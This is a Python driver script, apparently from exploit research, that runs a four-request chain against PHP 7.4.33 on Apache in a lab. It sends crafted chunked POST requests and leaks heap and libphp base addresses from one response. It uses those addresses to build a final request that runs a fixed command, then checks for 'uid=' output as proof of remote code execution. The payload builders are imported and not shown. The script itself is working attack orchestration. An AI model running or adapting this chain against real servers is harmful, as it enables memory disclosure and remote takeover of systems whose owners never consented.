#!/usr/bin/env python3
"""Run the four-request PHP 7.4.33 candidate chain in the isolated lab."""

from __future__ import annotations

import json
import re
import socket
import sys
import time
from pathlib import Path


HARNESS = Path("/harness")
PROFILE_PATH = Path("/research/php-7.4.33-apache-amd64-trans-sid.json")
RESULTS = Path("/results")
PROOF = Path("/proof/p")
sys.path.insert(0, str(HARNESS))

from exploit import Target  # noqa: E402
from php81_trans_sid import FIXED_COMMAND, Php81TransSidExploit  # noqa: E402
from profile import Profile, ProfileError, parse_hex  # noqa: E402


def status(response: bytes) -> str:
    line = response.partition(b"\r\n")[0]
    match = re.fullmatch(rb"HTTP/1\.[01] ([0-9]{3})(?: .*)?", line)
    return match.group(1).decode("ascii") if match else "none"


def main() -> int:
    if len(sys.argv) != 2 or not re.fullmatch(r"[A-Za-z0-9_.-]+", sys.argv[1]):
        raise SystemExit("usage: full_chain.py LABEL")
    out = RESULTS / sys.argv[1]
    out.mkdir(parents=True, exist_ok=False)

    raw = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
    profile = Profile(PROFILE_PATH, raw, raw["id"])
    address = socket.gethostbyname("target")
    target = Target("http://target/index.php", [address], timeout=30.0)
    engine = Php81TransSidExploit(target, profile, FIXED_COMMAND)
    summary: dict[str, object] = {
        "profile": raw["id"],
        "target_address": address,
        "command": FIXED_COMMAND.decode("ascii"),
    }

    started = time.monotonic()
    a1, boundary, query = engine.build_a1()
    response = target.post_chunked(a1, boundary, query=query, read_cap=1 << 20, timeout=180.0)
    (out / "a1.response").write_bytes(response)
    summary["a1_status"] = status(response)
    del a1
    time.sleep(0.2)

    b1, boundary, query = engine.build_b1()
    fake_len = parse_hex(engine.recipe["b1"]["fake_len"], "b1.fake_len")
    response = target.post_chunked(
        b1, boundary, query=query,
        read_cap=max(8 << 20, fake_len * 3 + (1 << 20)), timeout=600.0,
    )
    (out / "b1.response").write_bytes(response)
    summary["b1_status"] = status(response)
    del b1
    leak = engine.extract_b1_leak(response)
    (out / "b1.leak").write_bytes(leak)
    disclosure = engine.parse_b1_leak(leak)
    summary.update({
        "b1_leak_length": len(leak),
        "main_chunk": hex(disclosure.main_chunk),
        "libphp_base": hex(disclosure.libphp_base),
        "zval_ptr_dtor": hex(disclosure.zval_ptr_dtor),
        "dtor_hits": disclosure.dtor_hits,
    })
    time.sleep(0.2)

    a2, boundary = engine.build_a2()
    response = target.post_chunked_iter(a2, boundary, read_cap=1 << 20, timeout=240.0)
    (out / "a2.response").write_bytes(response)
    summary["a2_status"] = status(response)
    time.sleep(0.3)

    b2, boundary = engine.build_b2(disclosure.main_chunk, disclosure.libphp_base)
    response = target.post(b2, boundary, read_cap=1 << 20, timeout=120.0)
    (out / "b2.response").write_bytes(response)
    summary["b2_status"] = status(response)
    del b2
    time.sleep(0.8)

    try:
        proof = PROOF.read_text(encoding="utf-8", errors="replace").strip()
    except FileNotFoundError:
        proof = ""
    summary["proof"] = proof
    summary["success"] = bool(re.match(r"^uid=[0-9]+", proof))
    summary["elapsed_seconds"] = round(time.monotonic() - started, 3)
    (out / "summary.json").write_text(json.dumps(summary, indent=2) + "\n", encoding="utf-8")
    print(json.dumps(summary, sort_keys=True), flush=True)
    return 0 if summary["success"] else 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except ProfileError as exc:
        print(f"PROFILE_ERROR: {exc}", file=sys.stderr, flush=True)
        raise SystemExit(2)
